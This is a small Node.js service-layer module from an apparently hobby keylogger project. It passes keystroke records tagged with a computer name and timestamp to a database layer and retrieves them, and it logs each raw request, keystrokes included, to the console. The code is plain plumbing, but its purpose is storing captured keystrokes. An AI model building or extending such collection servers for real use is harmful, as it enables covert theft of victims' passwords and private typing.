/**
 * Author: Keven McDowell
 * Description: Acts as the service layer, which in the Model View Controller
 * idea of laying things out, is mean't to handle all business logic
 * happening on the server. Anything that needs to go to the database from
 * the controller goes through here first.
 */

// Importing our Repository layer.
const keyloggerRepo = require("../repository/keyloggerRepo");

// Service module.
const keyloggerService = {
    // Function for telling the Repository layer to connect the database.
    connectDB:() => {
        return keyloggerRepo.connectDB();
    },
    // Function for sending keystrokes that need to be saved to the repository layer to be saved to the database.
    saveKeystrokes: postReq => {
        console.log("POST REQUEST: ", postReq);
        return keyloggerRepo.saveStrokes(postReq.computerName, postReq.keystrokes, postReq.timestamp);
    },
    // Function for grabbing all of our keystrokes from the database in the repository layer. 
    getAllStrokes: () => {
        return keyloggerRepo.retrieveKeyStrokes();
    },
    getKeyStrokesByName: compName => {
        return keyloggerRepo.getStrokesByIp(compName);
    }
};


module.exports = keyloggerService;